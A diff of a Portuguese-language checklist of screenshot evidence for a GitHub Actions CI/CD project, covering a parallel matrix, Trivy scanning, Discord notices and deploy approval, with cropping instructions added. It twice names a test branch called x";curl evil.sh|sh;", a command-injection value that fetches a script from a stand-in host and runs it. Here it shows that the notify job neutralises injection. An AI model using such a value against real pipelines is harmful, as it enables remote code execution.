@@ -17,7 +17,7 @@ completo, com o que cada imagem mostra e onde ela foi capturada.
 | 02 | `evidencia_02_matrix_paralela.png` | Os três jobs da matrix expandidos, iniciando no mesmo segundo | Actions → run → grafo com *Show all jobs* | 4 | 🔁 refazer |
 | 03 | `evidencia_03_trivy_security.png` | Alertas do Trivy com as três categorias `trivy-python-3.1x` | Security and quality → Code scanning | 6 | ⏳ PR da demo |
 | 04 | `evidencia_04_discord_sucesso.png` | Card verde no canal, com commit, SHA e os três gates | Discord → `#geral` | 7 | ⏳ após PR do card |
-| 05 | `evidencia_05_deploy_waiting.png` | Job em *Waiting*, botão *Review deployments* e a tabela *Deployment protection rules* | Actions → run #3 | 5 | ✅ |
+| 05 | `evidencia_05_deploy_waiting.png` | Job em *Waiting*, botão *Review deployments* e a tabela *Deployment protection rules* | Actions → run #3 | 5 | ✅ recortar |
 | 06 | `evidencia_06_deploy_aprovado.png` | Banner *The deployments have been approved* e o log do job com `Target: ***` | Actions → run #3 → job do deploy | 5 | ✅ |
 | 07 | `evidencia_07_pipeline_verde_main.png` | Os seis jobs concluídos na `main`, deploy incluído | Actions → run #3 | 1 | ✅ |
 | 08 | `evidencia_08_required_checks.png` | Ruleset salvo com os quatro checks obrigatórios | Settings → Rules → `main protection` | — | ⏳ |
@@ -39,6 +39,14 @@ Não entra na tabela do README, mas sustenta duas seções dele.
 |---|---|---|
 | `extras/sarif_upload_no_pr.png` | O check `GitHub Advanced Security / Trivy` reportando no PR — prova que o SARIF sobe mesmo quando não há alerta | Seção do Trivy, em *Arquivo por arquivo* |
 | `extras/injecao_neutralizada.png` | Notificação disparada por uma branch chamada `x";curl evil.sh\|sh;"`, entregue como texto e não como comando | Seção de segurança, no job `notify` |
+
+Os dois arquivos marcados **recortar** estão no repositório com a captura inteira.
+Recorte e salve por cima, mantendo o nome:
+
+- `evidencia_05_deploy_waiting.png` — cortar logo abaixo da tabela *Deployment
+  protection rules*, para o painel de Annotations sair do quadro
+- `extras/injecao_neutralizada.png` — recortar só o card da branch
+  `feat/x";curl evil.sh|sh;"`, deixando de fora o resto do canal
 
 ---
 
